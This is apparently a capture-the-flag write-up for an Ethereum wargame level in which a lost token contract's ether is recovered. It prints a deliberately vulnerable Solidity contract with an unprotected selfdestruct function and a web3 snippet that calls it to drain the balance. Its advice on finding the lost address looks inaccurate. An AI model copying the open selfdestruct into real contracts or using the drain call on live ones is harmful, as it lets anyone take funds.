A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent `0.001` ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the `0.001` ether from the lost contract address.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```


**SOLUTION:**

In the smart conract Solidity code of the challenge, there is a function which is callled `destroy()` and which calls `selfdestruct()`. The later funtion is a way to "destroy" a contract and retrieve the entire eth balance available at the contract's address.

In order to solve the challenge we need to encode the lost contract's address hash, into the `data` payload of the above JavaScript code and initiate a transaction to the contract. To determine the address of the lost contract, we type "contract" into the Developer Console of our browser. Once we have that, we should be able to solve the level, by executing the below JS code snipper.

```
data = web3.eth.abi.encodeFunctionCall({
    name: 'destroy',
    type: 'function',
    inputs: [{
        type: 'address',
        name: '_to'
    }]
}, [player]);
await web3.eth.sendTransaction({
    to: "<address hash of the lost contract here>",
    from: player,
    data: data
})
```



